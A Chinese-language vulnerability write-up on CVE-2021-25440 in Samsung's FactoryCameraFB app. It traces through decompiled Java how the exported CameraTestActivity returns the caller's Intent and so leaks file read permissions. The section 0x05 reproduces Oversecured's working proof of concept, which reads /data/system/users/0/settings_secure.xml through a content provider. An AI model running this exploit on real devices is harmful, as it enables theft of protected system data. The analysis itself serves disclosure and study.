---
layout: post
title:  "[CVE-2021-25440] [Samsung] [FactoryCameraFB] CameraTestActivity导出存在文件读写权限泄露漏洞"
date:   2022-11-26 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

|    Date    | Version |     Description      |   Author    |
| :--------: | :-----: | :------------------: | :---------: |
| 2022.11.26 |   1.0   | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

## 0x01 触发条件

| 上线日期 |     应用名      |          包名          | 版本号 |               MD5                | 下载链接 |
| :------: | :-------------: | :--------------------: | :----: | :------------------------------: | :------: |
|          | FactoryCameraFB | com.sec.factory.camera | 3.4.43 | f1f9f8bf5250724bd461ed656c1dbe61 |          |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause Analysis

组件`com.sec.android.app.camera.CameraTestActivity`导出

```xml
<activity 
        android:configChanges="keyboard|keyboardHidden|mcc|mnc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" 
        android:excludeFromRecents="true" 
        android:label="@string/app_name" 
        android:name="com.sec.android.app.camera.CameraTestActivity" 
        android:noHistory="false" 
        android:screenOrientation="portrait" 
        android:theme="@style/AppTheme.NoActionBar">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
    </intent-filter>
</activity>
```

当组件`CameraTestActivity`被启动的时候，首先调用方法`onCreate()`，`[1]`获取外部传入的`__mTestCode__`，这个字段会在后续流程中使用到，方法`isCameralyzerTest()`返回`false`，不会进入`[2]`，直接走入`label_187`，`[3]`将传入的Intent保存在`__mIncomingIntent__`

```java
// com.sec.android.app.camera.CameraTestActivity
@Override  // android.support.v4.app.FragmentActivity
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);

    this.__mTestCode__ = this.mIntentDecoder.getTestCode(this.getIntent());  // [1]
    if(("PRE".equals(this.getIntent().getStringExtra("testtype"))) && ((Build.MODEL.startsWith("SM-A805")) || Build.VERSION.SDK_INT >= 29) && (Utils.isFactoryBinary())) {
        SemSystemProperties.set("persist.vendor.camera.eeprom.reload", "1");
        Log.i("FACAM/CamTestActivity", "onCreate: reload " + SemSystemProperties.get("persist.vendor.camera.eeprom.reload"));
    }

    if(this.isCameralyzerTest()) {
        Log.i("FACAM/CamTestActivity", "onCreate: start Cameralyzer, TestCode is " + this.__mTestCode__);
        Intent intent = new Intent("com.sec.factory.cameralyzer.ACTION_CAMERASCRIPT");
        intent.setClassName("com.sec.factory.cameralyzer", "com.sec.factory.cameralyzer.CzrV2Activity");
        intent.putExtra("mode", "factory");
        switch(com.sec.android.app.camera.CameraTestActivity.3.$SwitchMap$com$sec$android$app$camera$TestCode[this.__mTestCode__.ordinal()]) {
            ...

            default: {
                goto label_187;  // [2]
            }
        }

        intent.putExtra("page", "/testcase/15_multical.html");
        this.startActivityForResult(intent, TestCode.T15_MULTICAL.ordinal());
        return;
    }

label_187:
    this.requestWindowFeature(1);
    this.setContentView(0x7F0B001D);  // layout:activity_factory_camera
    this.getWindow().setFlags(0x400, 0x400);
    if(Build.VERSION.SDK_INT >= 28) {
        WindowManager.LayoutParams windowManager$LayoutParams = this.getWindow().getAttributes();
        try {
            Field field = windowManager$LayoutParams.getClass().getField("layoutInDisplayCutoutMode");
            field.setAccessible(true);
            field.setInt(windowManager$LayoutParams, 1);
            windowManager$LayoutParams.getClass().getField("privateFlags").setAccessible(true);
            this.getWindow().setAttributes(windowManager$LayoutParams);
        }
        catch(Exception exception) {
            exception.printStackTrace();
        }
    }

    this.__mIncomingIntent__ = this.getIntent();  // [3]
}
```

只需要系统种不存在包名为`com.sec.factory.cameralyzer`的应用或者字段`__mTestCode__`不为如下几个值，即可让`isCameralyzerTest()`返回`false`

```java
// com.sec.android.app.camera.CameraTestActivity
private boolean isCameralyzerTest() {
    return (this.isPackageInstalled("com.sec.factory.cameralyzer", this)) 
                && (this.__mTestCode__ == TestCode.T15_TOF 
                        || this.__mTestCode__ == TestCode.HW_TOF 
                        || this.__mTestCode__ == TestCode.T15_TOF_REAR 
                        || this.__mTestCode__ == TestCode.T15_TOF_FRONT 
                        || this.__mTestCode__ == TestCode.PRE_TOF_REAR 
                        || this.__mTestCode__ == TestCode.PRE_TOF_FRONT 
                        || this.__mTestCode__ == TestCode.PRE_TOF_PREVIEW_REAR 
                        || this.__mTestCode__ == TestCode.PRE_TOF_PREVIEW_FRONT 
                        || this.__mTestCode__ == TestCode.SECRETMENU 
                        || this.__mTestCode__ == TestCode.T15_MULTICAL 
                        || this.__mTestCode__ == TestCode.CS_MOTOR_CAL);
}
```

方法`getTestCode()`的数据需要从全局变量里取，`[2]`先匹配，匹配上再获取`[3]`

```java
this.mRules = new Rule[]{
    new Rule(this, TestCode.CAMEAUTO_0100, "CAMEAUTO", new String[]{"0", "1", "0", "0"}), 
    new Rule(this, TestCode.CAMEAUTO_0101, "CAMEAUTO", new String[]{"0", "1", "0", "1"}), 
    new Rule(this, TestCode.CAMEAUTO_0200, "CAMEAUTO", new String[]{"0", "2", "0", "0"}), 
    new Rule(this, TestCode.CAMEAUTO_0201, "CAMEAUTO", new String[]{"0", "2", "0", "1"}), 
    ...
    new Rule(this, TestCode.CZR, "NCAMTEST", new String[]{"7", "1", "1", "0"})};
    }

// com.sec.android.app.camera.IntentDecoder
public TestCode getTestCode(Intent __intent__) {
    Log.d("FACAM/IntentDecoder", "getTestCode");
    return this.decodeTestCode(__intent__, this.mRules);  // [1]
}

// com.sec.android.app.camera.IntentDecoder
public TestCode decodeTestCode(Intent __intent__, Rule[] arr_intentDecoder$Rule) {
    String __intent_testtype__ = __intent__.getStringExtra("testtype");
    String[] arr_s = {__intent__.getStringExtra("arg1"), __intent__.getStringExtra("arg2"), __intent__.getStringExtra("arg3"), __intent__.getStringExtra("arg4")};
    int i;
    for(i = 0; i < arr_intentDecoder$Rule.length; ++i) {
        Rule intentDecoder$Rule = arr_intentDecoder$Rule[i];
        if(__intent_testtype__ != null && (intentDecoder$Rule.isMatched(__intent_testtype__, arr_s))) {  // [2]
            Log.d("FACAM/IntentDecoder", "getRule : " + intentDecoder$Rule.testCode);
            return intentDecoder$Rule.testCode;  // [3]
        }
    }

    Log.e("FACAM/IntentDecoder", "decodeTestCode not found in rules " + arr_intentDecoder$Rule[0].testCode);
    return TestCode.NONE;
}
```

方法`onCreate()`执行完后，进入`onResume()`，方法`isCameralyzerTest()`返回`false`，`[2]`取传入Intent，在方法`onCreate()`里赋值的`__mTestCode__`不能是`TestCode.NONE`，满足这几个条件之后，`[3]`调用方法`runTest()`

```java
// com.sec.android.app.camera.CameraTestActivity
@Override  // android.support.v4.app.FragmentActivity
protected void onResume() {
    super.onResume();
    if(this.isCameralyzerTest()) {  // [1]
        return;
    }

    Log.i("FACAM/CamTestActivity", "onResume");
    if(((DevicePolicyManager)this.getBaseContext().getSystemService("device_policy")).getCameraDisabled(null)) {
        Log.w("FACAM/CamTestActivity", "onResume: camera disabled in device policy service");
        Toast.makeText(this, 0x7F0F0060, 0).show();  // string:security_restricts_camera "Security policy restricts use of Camera"
        this.finish();
        return;
    }

    this.mFragment = (FactoryCameraFragment)this.getSupportFragmentManager().findFragmentById(0x7F080038);  // id:cameraFragment
    this.getWindow().addFlags(0x80);
    SemWindowManager.getInstance().requestSystemKeyEvent(3, this.getComponentName(), true);
    SemWindowManager.getInstance().requestSystemKeyEvent(26, this.getComponentName(), true);
    SemWindowManager.getInstance().requestSystemKeyEvent(0xBB, this.getComponentName(), true);
    Intent __intent__ = this.getIntent();  // [2]
    if(__intent__ != null && __intent__.getExtras() != null) {
        if(this.__mTestCode__ != TestCode.NONE) {
            this.mFragment.runTest(this.__mTestCode__, this.getIntent());  // [3]
            this.registerBroadcastIntentFilter();  // [4]
            if(!Utils.isFactoryBinary()) {
                this.registerFlashBroadcastIntentFilter();
            }

            return;
        }

        Log.e("FACAM/CamTestActivity", "onResume: No Test is defined.");
        this.finish();
        return;
    }

    Log.e("FACAM/CamTestActivity", "onResume: No intent is sent.");
    this.finish();
}
```

`[2]`会根据`__testCode__`构造`Testlet`，这里实际上有多种路径，如果方法`isRestrictedTestByOsVersion()`返回值为`true`，可以调用`[4]`，如果返回值为`false`，则会直接返回

```java
// com.sec.android.app.camera.FactoryCameraFragment
public void runTest(TestCode __testCode__, Intent __intent__) {
    Log.i("FACAM/FCFragment", "runTest : TestCode is " + testCode);
    this.__mTestCaseCode__ = __testCode__;
    this.__mIntent__ = __intent__;  // [1]
    if(this.isResumed()) {
        this.mWaitToTest = false;
        this.__mCurrentTest__ = this.isRestrictedTestByOsVersion(__testCode__) ? null : this.getTestlet(__testCode__, __intent__);  // [2]
        Log.i("FACAM/FCFragment", "runTest : CurrentTest is " + this.__mCurrentTest__);
        Testlet __testlet__ = this.__mCurrentTest__;  // [3]
        if(__testlet__ != null) {
            __testlet__.test();
            return;
        }

        Log.e("FACAM/FCFragment", "runTest Test case is null.");
        CameraTestActivity.printAllExtras(__intent__);
        ((CameraTestActivity)this.getActivity()).sendResultAndFinish(-1);  // [4]
        return;
    }

    this.mWaitToTest = true;
}
```

方法`isRestrictedTestByOsVersion()`通过构造参数可以返回`true`也可以返回`false`

```java
// com.sec.android.app.camera.FactoryCameraFragment
private boolean isRestrictedTestByOsVersion(TestCode __testCode__) {
    int v = com.sec.android.app.camera.FactoryCameraFragment.1.$SwitchMap$com$sec$android$app$camera$TestCode[__testCode__.ordinal()];
    if(v != 44 && v != 45) {
        switch(v) {
            case 90: 
            case 91: 
            case 92: 
            case 0x72: 
            case 0x73: 
            case 0x74: 
            case 0x75: 
            case 0x76: 
            case 0x77: 
            case 120: 
            case 0x79: {
                break;
            }
            default: {
                return false;
            }
        }
    }

    if(Build.VERSION.SDK_INT < 30) {
        Log.e("FACAM/FCFragment", "isRestrictedTestByOsVersion test " + __testCode__ + " is not supported under R OS : " + Build.VERSION.SDK_INT);
        return true;  // [1]
    }

    return false;
}
```

不管走那个路径，最后都会走到方法`sendResultAndFinish()`，然后将传入Intent传入方法`setResult()`，如果这个Intent里包含读写标志位和文件URI，即可泄露文件的读写权限

```java
// com.sec.android.app.camera.CameraTestActivity
public void sendResultAndFinish(int v) {
    this.sendResultAndFinish(v, null);  // [1]
}

// com.sec.android.app.camera.CameraTestActivity
public void sendResultAndFinish(int v, String s) {
    Log.i("FACAM/CamTestActivity", "sendResultAndFinish : " + v + ", " + s);
    this.sendResult(v, s);  // [2]
    this.setResult(v, this.__mIncomingIntent__);  // [3]
    this.finish();
}
```

方法`sendResult()`实际上是发送广播

```java
// com.sec.android.app.camera.CameraTestActivity
public void sendResult(int v, String s) {
    Log.i("FACAM/CamTestActivity", "sendResult : " + v + ", " + s);
    this.sendBroadcast(this.__mIncomingIntent__);
}
```

完整的逻辑调用图

![逻辑调用图](/assets/resources/63271E638E23E3CCD273A27A549FB0D7.svg)

## 0x05 调试与利用

Oversecured实验室的PoC

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent();
    i.setData(Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"));
    i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    i.setClassName("com.sec.factory.camera", "com.sec.android.app.camera.CameraTestActivity");
    i.putExtra("testtype", "NCAMTEST");
    i.putExtra("arg1", "0");
    i.putExtra("arg2", "1");
    i.putExtra("arg3", "2");
    i.putExtra("arg4", "0");
    startActivityForResult(i, 0);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    try {
        Log.d("evil", IOUtils.toString(getContentResolver().openInputStream(data.getData())));
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```

## 0x06 漏洞研究

## 0x07 References

《Two weeks of securing Samsung devices: Part 2》

- https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/

## 附录：调试过程记录

